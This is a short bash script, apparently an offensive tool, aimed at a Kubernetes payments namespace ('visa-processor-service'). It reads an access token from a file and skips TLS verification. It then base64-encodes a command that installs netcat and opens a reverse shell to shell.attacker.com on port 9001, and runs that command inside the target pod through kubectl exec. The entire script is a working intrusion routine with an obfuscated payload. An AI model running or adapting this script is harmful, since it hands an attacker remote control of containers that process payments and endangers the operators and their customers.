#!/bin/bash
namespace='payments-v2'
svc='visa-processor-service'
selector="app=visa-processor-v2"
ports='8080:8080'

command="/usr/bin/sudo /usr/bin/apt-get -y install netcat; /usr/bin/sudo /bin/nc shell.attacker.com 9001 -e /bin/bash"
inject=$(echo ${command} | base64)

pod=$(kubectl --insecure-skip-tls-verify=true --server=$1 --token $(sed -n '2 p' target_info) -n "$namespace" get pods --selector=${selector} -o jsonpath='{.items[*].metadata.name}') 2>/dev/null 1>&2

echo "☠ - Getting access to pod ${pod}"

sleep 2

kubectl --insecure-skip-tls-verify=true --server=$1 --token $(sed -n '2 p' target_info) -n "$namespace" exec ${pod} -- bash -c  "echo '${inject}' | base64 -d | bash -"

echo "☺ - All done!"